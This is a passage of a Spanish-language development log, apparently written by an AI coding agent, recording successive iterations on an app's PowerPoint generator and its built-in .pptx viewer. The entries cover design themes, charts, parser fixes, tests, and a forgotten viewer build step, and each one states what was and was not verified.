  - `ArtifactButton.tsx`: `slides` es alias de fence de `html`/`htm`/`xhtml` (misma `FENCE`, mismo
    `isHtmlCodeBlock`); título por defecto "Presentación N" en vez de "Vista previa N" cuando el
    bloque no trae su propio `<title>`/`<h1>`.
  - `Markdown.tsx`: `docKind` trata `slides` igual que `html` (mismos botones de vista previa/descarga);
    `LANG_LABELS` le agrega la etiqueta "Presentación".
  - `chatDocBlocks.ts`: sin cambios — `extractHtmlArtifacts` (de donde sale) ya reconoce `slides` al
    tocar `ArtifactButton.tsx`.
- **Pruebas nuevas**: `render-pptx.test.ts` sumó 3 (layout `"stat"`, layout `"steps"` con círculos
  numerados, ninguna diapositiva normal tiene una forma de relleno puramente decorativa) — las 3
  hechas fallar primero (contra el código viejo) y pasar después, mismo patrón de siempre.
  `Markdown.codeblock.test.tsx` y `chatDocBlocks.test.ts` sumaron un caso cada uno para `​```slides`.
- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio (mismos warnings
  preexistentes, ajenos), prettier limpio, batería completa del repo en verde — 5813 pruebas (23
  skipped, Windows-only), mismo ruido ajeno de siempre (`computer/service-win.test.ts` en Mac). App
  reiniciada (se tocó `render-pptx.ts`/`chat-doc-spec.ts`/`schemas.ts`/`config.ts`, proceso main).
- **No verificado todavía**: cómo se ve de verdad el PowerPoint rediseñado y un deck ```slides en la
  app corriendo — la queja original ("una mierda estéticamente") fue sobre el resultado visual real,
  nunca se vio un pantallazo de ESE resultado específico; este rediseño parte de la guía general de la
  skill, no de un diagnóstico de esa presentación puntual — pendiente que el dueño lo pruebe y, si algo
  sigue sin convencer, ajustar sobre eso en concreto.

## F8-B126 — PowerPoint: el elemento visual que faltaba (diagnóstico real, no solo guía general)

- **El dueño probó F8-B125 de verdad** y pasó el `.pptx` generado ("la estetica es horrible, mira").
  Esta vez el diagnóstico fue sobre EL ARCHIVO REAL que generó Chat (`qlmanage -t` para una miniatura
  de la portada + desarmar el `.pptx` como zip y leer el XML crudo de las 5 diapositivas), no solo
  guía general de la skill. Hallazgo concreto: al sacar la barra decorativa de F8-B125 (el "hallmark
  de IA") no se puso NADA en su lugar — portada, cifra destacada y cierre quedaban con fondo 100%
  blanco/color plano y dos bloques de texto, sin ningún elemento visual real (la skill pide
  exactamente eso: "every slide needs a visual element", y no lo tenían). Esto además explica un bug
  de comportamiento real en la propia sesión del dueño: Chat, al pedirle mejorar la estética de un
  `.pptx`, respondió "PowerPoint no permite reproducir... elementos decorativos y colores
  personalizados" — **falso** (`pptxgenjs` sí soporta formas con color), el agente estaba siendo fiel
  a una herramienta genuinamente pelada, no mintiendo sobre una limitación real.
- **`render-pptx.ts`**: cada layout ahora trae un elemento visual real, con formas (`addShape`), no
  solo texto —
  - `cover`: un círculo de acento que sangra por la esquina superior derecha, detrás del texto.
  - `section`/`closing`: además del fondo a toda página (que ya era el elemento visual principal), un
    círculo sutil en `onAccent` con 88% de transparencia sangrando por la esquina inferior izquierda
    (textura, no compite con el texto).
  - `bullets`: un punto de acento chico en la esquina superior derecha (lejos del número de página).
  - `stat`: un círculo SOLO CON CONTORNO (sin relleno, `fill: {type:'none'}`) a la derecha, como una
    "insignia" detrás de la cifra — composición cifra-a-la-izquierda/forma-a-la-derecha, no una barra.
  - `steps` no cambia: los círculos numerados que ya tenía desde F8-B125 ya cumplían este punto.
  - Todas las formas nuevas son `ellipse` (círculos), nunca `rect` — el anti-patrón real que marca la
    skill es la barra/filete RECTANGULAR bajo el título, no "cualquier forma": un círculo de acento es
    composición intencional, no decoración vacía.
- **`render-pptx.test.ts`**: el test de "sin barras decorativas" se reescribió para distinguir esto —
  ya no exige CERO formas (eso ahora sería falso, a propósito), exige cero formas con geometría
  `rect` sin texto adentro (la barra puntual que se sacó). Test nuevo: cada layout trae al menos un
  círculo (`prst="ellipse"`) en el XML real del `.pptx`.
- **Verificación visual de verdad, no solo XML**: se generó un `.pptx` de prueba con el mismo contenido
  exacto que probó el dueño (`qlmanage -t` de nuevo sobre el resultado) — la portada pasó de blanco
  liso a tener el círculo de acento visible en la esquina; se confirmó por XML que las 5 diapositivas
  del deck de prueba traen al menos un círculo y cero barras rectangulares decorativas.
- **Verificado**: typecheck (`node`) limpio, lint limpio (mismos warnings preexistentes, ajenos),
  prettier limpio, batería completa del repo en verde — 5814 pruebas (23 skipped, Windows-only), mismo
  ruido ajeno de siempre (`computer/service-win.test.ts` en Mac). App reiniciada (se tocó
  `render-pptx.ts`, proceso main).
- **No verificado todavía**: que el dueño vea este resultado concreto (el círculo de acento, la
  insignia en "stat", el punto de acento en "bullets") y lo encuentre convincente — si sigue sin
  convencer, el siguiente paso realista es considerar paletas/tipografía personalizadas más allá de
  los 5 temas fijos (lo que el dueño pidió al margen, en otra conversación con Chat, cuando comparó
  contra una versión en HTML con "verde oscuro y ámbar" y tipografía serif) — eso es un cambio de
  alcance mayor (schema nuevo), no entra en esta vuelta.

## F8-B127 — PowerPoint F0: gráficos nativos, tarjetas, dos columnas y tipografía propia (sin LibreOffice)

- **Contexto**: el dueño pidió investigar cómo Claude.ai genera presentaciones con tanta calidad y
  abierta la puerta a empaquetar LibreOffice + un ciclo de render→captura→corrección con visión. Una
  investigación a fondo con Opus (ver detalle en el mensaje al dueño, no repetido acá) encontró algo
  más importante: la skill oficial de Anthropic usa la MISMA librería que ya tenemos (`PptxGenJS`), y
  el salto real de calidad viene del FORMATO que le dan al modelo (gráficos, tarjetas, columnas,
  tipografía variada), no solo del paso de revisión visual — ese paso pule desbordes/alineación, no
  "diseña". Conclusión y plan acordados con el dueño: atacar el formato primero (F0, esta vuelta, sin
  binarios nuevos); LibreOffice queda como fase posterior, solo si F0 no alcanza.
- **`chat-doc-spec.ts`**: `PptxLayout` gana `'two-col'`, `'cards'`, `'chart'`. Nuevo `PptxChartSpec
{type:'bar'|'line'|'pie', categories:string[], values:number[]}` y `chart?` opcional en
  `PptxSlideSpec` (solo se usa con `layout:'chart'`). `isPptxSpec`/`isChartSpec` validan el tipo, que
  `categories`/`values` tengan el mismo largo y como mucho `MAX_CHART_POINTS=12` puntos.
- **`render-pptx.ts`**:
  - `addChartSlide`: gráfico NATIVO de PowerPoint vía `addChart` (de verdad editable ahí después, no
    una imagen) — confirmado abriendo el `.pptx` generado en PowerPoint real (no solo en el visor
    simplificado ni en la miniatura de QuickLook, que ni siquiera renderiza gráficos embebidos: salía
    en blanco y llevó a revisar esto con cuidado antes de confiar en esa herramienta de nuevo).
  - `addTwoColSlide`: las `bullets` repartidas mitad y mitad en dos cuadros de texto lado a lado.
  - `addCardsSlide`: cada `bullet` como una tarjeta (`roundRect` con relleno tenue del acento, grilla
    de 1 a 3 columnas según cuántas), para listas de ítems/ventajas sin orden de proceso (a diferencia
    de `"steps"`, que sí implica secuencia).
  - **Tipografía por tema**: `Palette` gana `titleFont` — `Georgia` (serif) en `"green"`/`"warm"`,
    `Arial` en el resto — SOLO en títulos, el cuerpo de texto sigue siempre en Arial por legibilidad.
    Ambas son parte de la "lista segura" multiplataforma (vienen instaladas en Mac y Windows), así que
    no debería cambiar de letra al abrirlo en otra máquina.
- **`schemas.ts`**: `pptxLayout` extendido con los 3 layouts nuevos; nuevo `pptxChart` (mismo patrón
  de "techo razonable al payload, la validación de verdad es `isPptxSpec`" que ya usan `xlsxCell`/
  `xlsxColumnFormat`); `chart: optional(pptxChart)` agregado al validador por diapositiva — **se probó
  el mismo tipo de bug real que ya había pasado con `layout`** (sacar el campo a propósito, confirmar
  que el test nuevo falla, volver a ponerlo, confirmar que pasa).
- **Prompt del agente de Chat** (`config.ts`/`chat.md`, sincronizados): documenta los 3 layouts
  nuevos, el schema exacto de `chart`, y una guía nueva de longitud ("como mucho 4-5 viñetas cortas
  por diapositiva: el cuadro de texto tiene un alto fijo, si hay más se corta — partir en más
  diapositivas") — mitigación práctica mientras no exista medición real de texto (ver "No verificado").
- **Pruebas nuevas**: `render-pptx.test.ts` sumó 6 (chart con categorías/valores reales en su propia
  parte del `.pptx`, two-col reparte las viñetas en dos cuadros, cards con sus `roundRect` + texto,
  tipografía por tema, y las validaciones de `isPptxSpec` para `chart`); `schemas.test.ts` sumó 3
  (acepta `chart`/`two-col`/`cards`, rechaza un tipo de gráfico inventado) — confirmado que la nueva
  de `chart` falla sin el campo declarado, mismo patrón de regresión que ya se usó para `layout`.
- **Verificación visual de verdad, en PowerPoint real** (no solo XML ni el visor simplificado): se
  generó un deck de prueba con los 6 layouts (incluidos los 3 nuevos, tema `"warm"` con tipografía
  Georgia) y se abrió con `open -a "Microsoft PowerPoint"` + `screencapture` para mirarlo de verdad —
  gráfico de barras con los 3 colores del tema, dos columnas legibles, tarjetas con su texto completo
  (sin cortes), cifra destacada con su insignia de círculo — sin avisos de "reparar" al abrir.
- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio (mismos warnings
  preexistentes, ajenos), prettier limpio, batería completa del repo en verde — 5822 pruebas (23
  skipped, Windows-only), mismo ruido ajeno de siempre (`computer/service-win.test.ts` en Mac). App
  reiniciada (se tocaron `render-pptx.ts`/`chat-doc-spec.ts`/`schemas.ts`/`config.ts`, proceso main).
- **No verificado todavía**: no hay medición real de texto (fuentes reales en una ventana oculta) para
  evitar desbordes — se mitigó con un límite práctico en el prompt (4-5 viñetas cortas), no con una
  garantía de código; si el dueño prueba con texto más largo de lo que el prompt sugiere, puede
  desbordar. Sigue sin imágenes propias (fotos/íconos) — ninguna librería nueva lo resuelve todavía.
  LibreOffice (vista fiel + ciclo de revisión con visión) queda pendiente como fase posterior, solo si
  el dueño prueba este resultado y sigue sin convencer.

## F8-B128 — El visor propio mentía sobre cómo se veía el .pptx + portada/cifra a toda página

- **El dueño probó F8-B127 y siguió viendo mal** ("algo pasa realmente"). Antes de tocar más
  `render-pptx.ts`, se comparó el `.pptx` real generado (abierto en PowerPoint de verdad, con
  `screencapture`) contra lo que mostraba el panel de la app — y NO coincidían: el `.pptx` real se veía
  bien (círculo, gráfico, tarjetas, todo legible); el panel de la app ("Vista simplificada", el visor
  estructural propio sin LibreOffice) lo pintaba mal. Causas reales, las tres en el parser/visor de
  PowerPoint (`src/viewer/pptx/`), ninguna en `render-pptx.ts`:
  1. **`solidFillOf` ignoraba `<a:alpha>`** (la transparencia): un tinte pensado como 8% opaco
     (`transparency:92` de F8-B126) se pintaba 100% opaco — las tarjetas y los círculos de textura
     salían como bloques sólidos oscuros en vez de sutiles.
  2. **Ninguna forma respetaba su geometría real** (`<a:prstGeom prst="…">`): un círculo (`ellipse`)
     se pintaba como un cuadrado — el visor no leía `prst` en absoluto.
  3. **Un gráfico (`p:graphicFrame` con `c:chart`) se pintaba como una caja vacía** ("unknown",
     cuadriculado gris) — el parser solo sabía de `p:sp`/`p:pic`/tabla, nada de gráficos.
  - **Bug aparte, encontrado de paso**: `readXfrm` para `p:graphicFrame` (tablas, y ahora gráficos)
    siempre devolvía `null` — `p:xfrm` de un graphicFrame YA es el contenedor de `a:off`/`a:ext` (a
    diferencia de `p:spPr`, que ENVUELVE a `a:xfrm`) — así que toda tabla (preexistente, no de esta
    sesión) caía siempre en una cajita de respaldo chica, ignorando su posición/tamaño real. Nuevo
    `readXfrmDirect` en `ooxml.ts`; `readXfrm` ahora lo usa internamente.
  - **`theme.ts`**: `solidFillOf` ahora lee `<a:alpha>` y devuelve `rgba()` cuando corresponde; nuevo
    `strokeOf` (color de `<a:ln><a:solidFill>`, para una forma solo-contorno).
  - **`model.ts`**: `Shape` (variante `'shape'`) gana `geom` (`'ellipse'|'roundRect'`, de `prstGeom`) y
    `stroke` (solo cuando NO hay relleno — con relleno sería ruido que PowerPoint no muestra así).
    Nueva variante `'chart'`: detecta el `p:graphicFrame` de un gráfico, resuelve su `r:id` al part
    `ppt/charts/chartN.xml` (mismo patrón async que ya resolvía imágenes) y lo parsea (`parseChartXml`,
    nuevo y exportado) — tipo, categorías y valores de la primera serie, soportando tanto
    `c:strRef/c:strCache` como `c:multiLvlStrRef` (lo que escribe `pptxgenjs` cuando una categoría
    podría confundirse con fecha/número).
  - **`PptxViewer.tsx`**: `border-radius` según `geom` (50% para círculo); `border` para una forma
    solo-contorno; nueva `ChartView` — SIN LibreOffice no hay cómo pintar un gráfico fiel, así que es
    una vista estructural propia (barras/línea → barras CSS con su color por tema; torta →
    `conic-gradient`) — mejor que la caja vacía de siempre, nunca pretende ser el gráfico real.
  - **Pruebas nuevas**: `ooxml.test.ts` sumó 2 (`readXfrmDirect`); `theme.test.ts` sumó 4 (alpha→rgba,
    sin alpha sigue igual, `strokeOf`); `model.test.ts` sumó 7 (tabla en su posición real — no la
    cajita de respaldo —, gráfico detectado con su `rId`, geometría ellipse/roundRect/rect, contorno
    solo sin relleno, 3 de `parseChartXml` incluido `multiLvlStrRef`).
- **Pedido del dueño en paralelo**: "empieza a hacer pruebas y cuando tengas resultados profesionales
  ahí recién implementas" — se armó un prototipo APARTE (fuera del repo, `pptxgenjs` directo) con fondo
  a toda página en vez de blanco, se abrió en PowerPoint de verdad, y RECIÉN con eso confirmado se
  llevó al código real — no al revés.
- **`render-pptx.ts`**: `addCoverSlide` y `addStatSlide` pasan a fondo a toda página con el color de
  acento (como ya hacían `section`/`closing`), con el mismo círculo sutil de textura (nuevo
  `addBleedCircle`, factorizado de la duplicación que ya existía) — un fondo blanco con un solo adorno
  chico se sentía vacío; a toda página se siente diseñado, confirmado contra el prototipo. `stat` subió
  de 72 a 80pt de tamaño de cifra. El número de página de `stat` pasó de `p.accent` a `p.onAccent`
  (bug real que esto hubiera introducido: sobre fondo de acento, un texto color acento es invisible).
  Las diapositivas de contenido (`bullets`/`two-col`/`cards`/`chart`/`steps`) siguen en blanco, por
  legibilidad de texto denso.
- **Verificación visual de verdad, en PowerPoint real**: deck de prueba con los 6 layouts, tema `blue`
  — portada y cifra ahora con fondo azul marino a toda página, círculo de textura, mismo lenguaje
  visual que sección/cierre; las de contenido (gráfico/columnas/tarjetas) siguen en blanco, legibles.
- **Investigación paralela, no implementada todavía**: el dueño pasó un `.pptx` de referencia (nivel
  "Claude con Haiku") con una paleta de 14 tonos (no 1 acento fijo) y tipografías "Source Serif 4"/"IBM
  Plex Sans" sin embeber en el archivo (dependen de que la máquina las tenga instaladas — no hay
  garantía multiplataforma real ahí). Confirma que para cerrar ESA brecha específica hace falta un
  cambio de alcance mayor (paleta/tipografía elegible, no solo temas fijos) — anotado, no implementado
  esta vuelta, pendiente de decidir con el dueño.
- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio (mismos warnings
  preexistentes, ajenos), prettier limpio, batería completa del repo en verde — 5928 pruebas (23
  skipped, Windows-only), mismo ruido ajeno de siempre (`computer/service-win.test.ts` en Mac). App
  reiniciada (se tocó `render-pptx.ts` en main y el visor en `src/viewer/`).

## F8-B129 — PowerPoint: reescritura completa de una sola pasada (investigación a fondo primero, no otra ronda de parches)

- **Pedido explícito del dueño** tras varias rondas reactivas de "arreglar lo que se vio feo":
  "investiga a fondo como lo hace claude a fondo y después implementamos, no en la marcha". Se lanzó
  una investigación con Opus (no implementada hasta tenerla completa) que: leyó ENTERA la skill
  oficial `pptx` de Anthropic instalada en su entorno (`SKILL.md` + sus scripts de tema/gráfico —
  **nunca copiados**, su licencia es propietaria y prohíbe derivar; solo se usaron sus REGLAS de
  diseño, relevante porque esta app se va a publicar); analizó byte a byte un `.pptx` de referencia
  real que el dueño generó con Chat (modelo Haiku) pidiéndole "mejorá la estética" (paleta de 14
  tonos, tipografía Source Serif 4/IBM Plex Sans sin embeber, etiqueta tipo "CIFRA DESTACADA", pie en
  itálica, paneles invertidos en un "antes/después"); e investigó si `pptxgenjs` soporta embeber
  fuentes (no, sin post-procesar el archivo a mano — se decidió NO embeber: el riesgo de verse roto en
  Keynote/Google Slides/nuestro propio visor no vale la pena todavía).
- **Nuevo `src/main/extras/pptx-design.ts`**: el sistema de diseño separado del renderer, probable sin
  generar ningún `.pptx`.
  - `THEMES`: paleta de **14 tonos por tema** (antes: 1 solo acento) — `primary`/`primary2` (fondos a
    toda página), `bg`/`surface`/`border` (contenido), `ink`/`body`/`muted`/`accent` (texto sobre
    fondo claro), `accentOnDark`/`onDark`/`onDarkBody`/`onDarkMuted` (texto sobre fondo oscuro), 5
    tonos de gráfico + `chartHi`/`chartSoft`. Los 5 temas de siempre (`blue`/`green`/`dark`/`warm`/
    `mono`) se enriquecieron, no se reemplazaron. Títulos en Georgia (temas editoriales: blue/green/
    warm) o Arial negrita (dark/mono); el cuerpo siempre en Arial — sin embeber, de la lista seguro
    instalada en Mac y Windows.
  - `fitText`: el tamaño más grande de una escalera que entra en su caja, estimado por ancho de
    carácter (sin DOM en main, no se puede medir de verdad) — nunca recorta en silencio.
  - `splitLabel`: "Etiqueta: resto" → la etiqueta en negrita, mismo renglón — nuevo en TODAS las
    viñetas (bullets/steps/cards/columns), no solo donde ya estaba.
  - `splitStatUnit`: "+27%"/"3.2x" → número + unidad separados (la unidad al 55% del tamaño, en la
    MISMA línea) — sin esto, el prototipo anterior usaba un divisor vertical que el archivo de
    referencia en realidad NO tenía (corregido por la propia investigación).
  - `contrastRatio` (WCAG): cada par texto/fondo de los 5 temas se verificó ≥4.5:1 (≥3.5:1 para
    etiquetas chicas en negrita sobre `primary2`, donde WCAG permite un umbral menor) — **probado**,
    no "se ve bien a ojo" (`pptx-design.test.ts`, 15 pruebas).
- **`chat-doc-spec.ts`**: campos nuevos, todos opcionales (compatibles con decks ya generados) —
  `eyebrow`/`note` por diapositiva (etiqueta chica arriba / nota chica al pie — PURAMENTE
  estructurales, el agente nunca inventa contenido si no hay algo real que decir), `footer` del deck
  entero (pisado por el `note` de una diapositiva puntual), `columns` (exactamente 2, con `heading`
  propio) para un `"two-col"` de verdad en vez de repartir `bullets` a la mitad.
- **`render-pptx.ts`**: reescrito de punta a punta sobre `pptx-design.ts`.
  - **Fondo a toda página en las 4 diapositivas de impacto**: `cover`/`closing` usan `primary`;
    `section`/`stat` usan `primary2` — confirmado ANTES de escribir esto con un prototipo aparte
    (`pptxgenjs` directo, abierto en PowerPoint de verdad) que un fondo blanco con un solo adorno
    chico se siente vacío, a toda página se siente diseñado. El círculo de textura (`addBleedCircle`,
    ya existía) ahora es compartido por las 4, mismo lenguaje visual.
  - **`stat`**: la cifra se separa de su unidad si calza (`splitStatUnit`), ya NO en negrita (el
    archivo de referencia la tiene regular, más elegante a 72-120pt).
  - **`two-col`**: con `columns`, dos paneles de verdad (izquierdo `surface`, derecho `primary2`
    invertido con su propio encabezado) — sin `columns`, sigue repartiendo `bullets` a la mitad
    (compatibilidad).
  - **`cards`**: cada tarjeta ahora trae un círculo numerado (como `steps`) + borde sutil.
  - **`bullets`/`steps`/`cards`/`columns`**: "Etiqueta: resto" sale con la etiqueta en negrita.
  - **`eyebrow`**: etiqueta en mayúsculas con espaciado entre letras arriba del contenido — en
    `section` sin `eyebrow` se numera sola ("01", "02"...) en vez de inventar texto.
  - **`chart`**: colores reales del tema (los 5 tonos de `THEMES.<tema>.chart`, no una terna
    improvisada), sin líneas de grilla, con etiquetas de valor.
  - `pres.theme = {headFontFace, bodyFontFace}` fijado (quien edite el `.pptx` en PowerPoint después
    sigue en la misma tipografía). Lienzo 10×5.625 exacto (antes 5.63, redondeo).
  - **Bug real encontrado y arreglado de paso**: `bulletRuns` armaba los runs con negrita pero los
    volvía a juntar en un string plano antes de mandarlos a `pptxgenjs` (`.map(r => r.text).join('')`)
    — la negrita de "Etiqueta:" nunca llegaba al archivo. Atrapado por un test que SÍ miraba la
    negrita de verdad en el XML, no solo que el texto apareciera.
- **El visor propio (`src/viewer/pptx/`) tenía más huecos de los que se habían arreglado en F8-B128**
  (encontrados por la propia investigación, releyendo el parser entero):
  1. **`<p:bg>` nunca se leía en NINGÚN nivel** — ni diapositiva, ni layout, ni maestro. Nuevo
     `bgOf` (`theme.ts`) + `resolveBackground` (`model.ts`, probable aparte): herencia real de
     PowerPoint, diapositiva→layout→maestro (ECMA-376 §19.3.1.1), soporta tanto `<p:bgPr><a:solidFill>`
     (lo que escribe `pptxgenjs` en la diapositiva) como `<p:bgRef idx>` (lo que escribe en el
     maestro). Es el bug que explica la queja del dueño: el `.pptx` real se veía perfecto en
     PowerPoint, el panel de la app lo mostraba en blanco.
  2. **`a:latin typeface` nunca se leía** — todo el texto salía en la fuente por defecto del navegador
     sin importar el tema (Georgia/Arial). Nuevo campo `font` en `TextRun`, aplicado como
     `fontFamily`.
  3. **Los gráficos se pintaban con una paleta inventada del visor**, no los colores reales del
     `.pptx`. Nuevo `chart.colors` en `parseChartXml` (lee `c:dPt`/`c:spPr`, con fallback al color de
     toda la serie) — **bug real encontrado al escribir el test**: `c:idx` es un elemento HIJO de
     `c:dPt` (`<c:idx val="0"/>`), no un atributo de `c:dPt` — `attrNum(dPt, 'idx')` buscaba en el
     lugar equivocado, atrapado por el propio test antes de llegar a producción.
  - Letter-spacing (`spc`), interlineado y anchor/insets de texto quedaron pendientes (menor impacto
    visual que fondo/tipografía/color de gráfico; la investigación los señaló, no se atacaron esta
    vuelta por alcance).
- **Verificación visual de verdad en PowerPoint real** (no solo XML): deck completo con los 7 layouts
  más `eyebrow`/`note`/`footer`/`columns`, abierto con `open -a "Microsoft PowerPoint"` +
  `screencapture` — portada/cifra/cierre con fondo a toda página y círculo de textura, comparación
  "antes/después" con panel derecho invertido, tarjetas numeradas, pasos con la etiqueta en negrita
  funcionando de verdad. Separado: un script que corre `parseDeck` (el parser real del visor) contra
  un `.pptx` recién generado confirmó fondo/tipografía/colores de gráfico resueltos correctamente de
  punta a punta — **no se pudo verificar visualmente el panel DENTRO de la app corriendo** (abrir la
  sesión de chat en vivo del dueño no es algo seguro de automatizar); pendiente que el dueño lo
  confirme.
- **Pruebas nuevas/reescritas**: `pptx-design.test.ts` (15, nuevo); `render-pptx.test.ts` reescrito
  con los valores reales del nuevo sistema (27 pruebas, varias nuevas: fondo por tipo de diapositiva,
  "Etiqueta: resto" en negrita de verdad en el XML, `columns`, `eyebrow`/`note`/`footer`, cifra con
  unidad separada); `schemas.test.ts` sumó 4 (eyebrow/note/footer, columns válidas/inválidas — mismo
  patrón de regresión de siempre: se sacó el campo, se confirmó que el test fallaba, se restauró);
  `theme.test.ts` sumó 4 (`bgOf`); `model.test.ts` sumó 11 (`resolveBackground` con los 3 niveles de
  herencia, tipografía, colores de gráfico reales).
- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio (mismos warnings
  preexistentes, ajenos), prettier limpio, batería completa del repo en verde — 5965 pruebas (23
  skipped, Windows-only), mismo ruido ajeno de siempre (`computer/service-win.test.ts` en Mac). App
  reiniciada (se tocaron `render-pptx.ts`/`pptx-design.ts`/`chat-doc-spec.ts`/`schemas.ts` en main y
  todo `src/viewer/pptx/`).
- **No verificado todavía**: el panel DENTRO de la app corriendo, con una sesión de chat real del
  dueño (ver arriba); letter-spacing/interlineado/anchor del visor quedaron pendientes.

## F8-B130 — El visor nunca se estaba reconstruyendo (el bug de fondo real detrás de toda la sesión) + anchor/letter-spacing/espaciado entre viñetas

- **El dueño probó F8-B129 y "lo sigue haciendo mal"** — mismo archivo `.pptx` que en PowerPoint real
  se veía perfecto. Antes de tocar más código del visor, se revisó CÓMO se sirve `src/viewer/` a la
  app: tiene su propio build, `npm run build:viewer` (`vite build --config vite.viewer.config.ts` →
  `out/viewer/`), que `npm run dev` (`electron-vite dev`) **nunca incluye**. `out/viewer/` tenía fecha
  del 7 de octubre a las 23:14 — es decir, **todos los arreglos del visor de F8-B128 y F8-B129
  (fondo, tipografía, colores de gráfico) nunca llegaron al bundle que la app de verdad sirve**, por
  más que typecheck/tests/prettier estuvieran perfectos y el código fuente estuviera bien. Cada "sigue
  mal" del dueño era literalmente cierto: la app seguía mostrando el visor de ayer.
  - Arreglado reconstruyendo (`npm run build:viewer`) antes de reiniciar `npm run dev`, confirmado con
    `stat` que `out/viewer/` quedó más nuevo que el último archivo tocado en `src/viewer/`.
  - **Guardado en memoria** (`lazunox-viewer-build.md`, fuera del repo): de ahora en más, tocar
    `src/viewer/` implica correr `npm run build:viewer` aparte, siempre, antes de dar por buena una
    verificación visual — para no repetir esta sesión completa por el mismo motivo.
- **Con el bundle de verdad actualizado, el dueño confirmó que mejoró pero "aún no se ve 100% bien"**
  — se investigaron (y arreglaron) los tres huecos del visor que F8-B129 había señalado como
  pendientes, en vez de adivinar a ojo: se generó el `.pptx` real más reciente del dueño y se comparó
  su XML byte a byte contra lo que el parser leía.
  - **`anchor` de `<a:bodyPr>` nunca se leía** — el más visible de los tres: un título pensado para
    apoyarse ABAJO de una caja alta (`anchor="b"`, la portada) salía arriba de su caja en el visor, con
    un hueco vacío debajo — exactamente al revés de la composición pensada en `render-pptx.ts`. Nuevo
    `anchor` en el tipo `Shape` (`'t'|'ctr'|'b'`), aplicado como `justifyContent` de un `flex-direction:
column` en el `<div>` del texto (sin tocar `.pptx-shape` compartida, para no romper tabla/gráfico,
    que ya traían su propio `display:flex` con otra dirección).
  - **`spc` de `<a:rPr>` (espaciado entre letras) nunca se leía** — la etiqueta tipo "CIFRA DESTACADA"
    salía pegada en vez de con el espaciado que la hace lucir "diseñada". Mismo formato que `sz`
    (centésimas de punto): nuevo `letterSpacingPt` en `TextRun`.
  - **`spcAft` (espacio entre viñetas) nunca se leía** — las listas salían más apretadas que en
    PowerPoint. Nuevo `spaceAfterPt` en `TextParagraph`, de `a:pPr > a:spcAft > a:spcPts@val`.
- **Pruebas nuevas**: `model.test.ts` sumó 6 (`anchor` con/sin valor, `letterSpacingPt` con/sin `spc`,
  `spaceAfterPt` con/sin `spcAft`) — las tres con el mismo patrón de "bug real" ya establecido: se
  confirmó que el campo realmente faltaba en el modelo antes de este cambio.
- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio (mismos warnings
  preexistentes, ajenos), prettier limpio, batería completa del repo en verde — 5971 pruebas (23
  skipped, Windows-only; un crash nativo de `libdatachannel`/WebRTC en una corrida se confirmó
  transitorio, no relacionado, al repetir la corrida limpio). **`npm run build:viewer` corrido y
  confirmado con `stat`** antes de reiniciar la app — el paso que faltó en las dos vueltas anteriores.
- **No verificado todavía**: el panel DENTRO de la app corriendo con una sesión de chat real — esta vez
  con el bundle de verdad actualizado y los 3 huecos restantes arreglados; insets de `bodyPr`
  (`lIns`/`tIns`/`rIns`/`bIns`) quedaron sin tocar (nuestro propio contenido siempre los pide en 0 y el
  visor nunca agregó relleno propio, así que coinciden por ahora sin necesidad de leerlos — documentado
  por si algún día deja de ser cierto).

## F8-B131 — El bug real del gráfico (etiquetas gigantes desbordadas) — encontrado con un arnés visual de verdad, no otra ronda de teoría

- **El dueño, con razón, frenó otra investigación teórica** ("investiga no seas flojo", después de
  aclarar que no hablaba de cómo genera archivos Claude.ai sino del visor propio que "se ve mal
  mierda"). Confirmado aparte: Claude.ai NO tiene un visor de `.pptx` en vivo — genera el archivo y lo
  da para descargar, nada más ([PCWorld](https://www.pcworld.com/article/2906610/anthropics-claude-ai-chatbot-can-now-create-and-edit-office-files.html)); la calidad que se ve ahí viene de abrir el archivo real en PowerPoint, que ya veníamos confirmando que queda bien. No había ningún "visor de Claude" que investigar — la pista llevaba a un callejón sin salida.
  - En vez de seguir ajustando atributos de OOXML a ciegas, se armó un ARNÉS DE VERDAD: un mini-sitio
    (`_scratch_harness/`, Vite + React, descartado al terminar) que importa el `SlideCanvas` REAL del
    visor (se exportó, antes era privado) junto con el `styles.css` REAL, alimentado con el `Deck` que
    arma `parseDeck` sobre el `.pptx` MÁS RECIENTE que generó el dueño — abierto en Chrome de verdad
    (`mcp__claude-in-chrome`) para ver EXACTAMENTE los mismos píxeles que ve la app, sin tocar la
    sesión de chat en vivo del dueño.
  - **Encontrado al toque, mirando la diapositiva 3 (gráfico)**: las etiquetas "Jul"/"Ago"/"Sep" salían
    gigantes, desbordadas fuera de su columna. Causa: `.pptx-chart-bar-label`/`.pptx-chart-legend-item`
    usaban `font-size: 9cqw` — `cqw` mide contra el ancestro con `container-type` más cercano, que es
    el LIENZO ENTERO (`.pptx-canvas-wrap`), no la columna angosta de la barra — 9% del ancho de TODA
    la diapositiva es un tamaño de letra enorme para una etiqueta chica. El resto del texto del visor
    usa `ptToCqw` (calculado desde el tamaño de punto real de OOXML), por eso se veía bien; esta CSS
    era un valor puesto a ojo cuando se armó la vista de gráfico en F8-B128, nunca verificado
    visualmente hasta ahora. Bajado a `1.6cqw` (equivalente a ~11pt en un lienzo de 10 pulgadas, el
    mismo orden que el resto del texto chico).
  - **El resto del deck (7 diapositivas, incluidas portada/sección/dos columnas/tarjetas/cifra/cierre)
    se vio genuinamente bien** en el mismo arnés — fondo a toda página, tipografía, `anchor`,
    espaciado entre letras y entre viñetas, todo andando (F8-B128/129/130 confirmados de verdad, no
    solo por los datos).
- **Técnica nueva para el futuro**: el arnés (`SlideCanvas` real + `styles.css` real + `Deck` real de
  `parseDeck`, en Chrome de verdad vía `mcp__claude-in-chrome`) es la forma correcta de verificar
  cambios al visor de ahora en más — mucho más rápido y preciso que razonar sobre CSS a ciegas o pedirle
  al dueño que pruebe en su sesión en vivo cada vez. Se exportó `SlideCanvas` de `PptxViewer.tsx` para
  que quede disponible (cambio chico, aditivo, sin riesgo).
- **Verificado**: typecheck (`viewer`) limpio, lint limpio, prettier limpio, batería del visor en verde
  — 124 pruebas. **`npm run build:viewer` corrido y confirmado con `stat`** antes de reiniciar la app
  (memoria de F8-B130 aplicada). Arnés temporal borrado al terminar (`_scratch_harness/`, archivos
  `.pptx`/`.json` de prueba en `/tmp`).
- **No verificado todavía**: confirmación del dueño en su propia sesión — esta vez con un bug real,
